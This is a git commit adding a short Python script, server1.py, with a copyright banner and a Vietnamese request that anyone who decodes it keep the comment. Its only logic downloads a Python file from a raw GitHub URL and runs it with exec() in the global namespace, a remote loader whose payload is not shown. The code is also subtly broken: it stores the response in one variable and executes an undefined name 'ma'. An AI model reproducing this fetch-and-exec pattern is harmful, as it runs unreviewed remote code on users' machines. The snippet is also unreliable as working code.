9fcd74d36e6c35f59483bc0ef24581c512ea0874
manhscuti <thailansever317@gmail.com>
2025-07-27 01:41:42 +0700

    Add server1.py

---
+++ server1.py
@@ -0,0 +1,15 @@
+#==≠==≠==≠==≠==≠====≠==≠==≠==≠==≠==≠==#
+#Copyright by JunidoKai
+#Version : 2.2.4
+#Python 3.12 
+#07/27/2025 01:39:45 GMT+07:00
+#Nếu decode vui lòng để lại comment này
+#==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==#
+#==≠==Thư Viện==≠==#
+import requests, os, sys, socket
+from time import sleep
+#==≠==Source==≠==#
+def main():
+	url = requests.get("https://raw.githubusercontent.com/manhscuti/Server/main/gitt.py")
+	exec(ma.text, globals())
+main()
